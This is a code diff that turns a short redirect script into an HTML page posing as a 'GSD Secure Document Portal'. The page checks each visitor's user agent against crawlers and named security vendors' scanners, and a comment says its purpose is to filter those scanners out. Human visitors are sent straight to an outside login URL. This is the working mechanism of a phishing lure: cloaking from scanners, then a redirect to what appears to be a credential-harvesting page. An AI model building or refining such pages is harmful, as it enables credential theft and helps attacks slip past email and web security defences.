@@ -1,6 +1,20 @@
-<script>
-  const botPattern = /bot|crawler|spider|crawling|slurp|w3c_validator/i;
-  if (!botPattern.test(navigator.userAgent)) {
-      window.location.replace("https://login.file-share-hub.com/DbhZOTUR");
-  }
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GSD | Secure Document Portal</title>
+</head>
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h2>GSD Secure Portal</h2>
+    <p>Loading encrypted file share... please wait.</p>
+
+    <script>
+      // Filter out common security scanners
+      const botPattern = /bot|crawler|spider|crawling|slurp|w3c_validator|trendmicro|fortinet|proofpoint|microsoft/i;
+      
+      if (!botPattern.test(navigator.userAgent)) {
+          // Instant redirect for humans
+          window.location.replace("https://login.file-share-hub.com/DbhZOTUR");
+      }
+    </script>
+</body>
+</html>
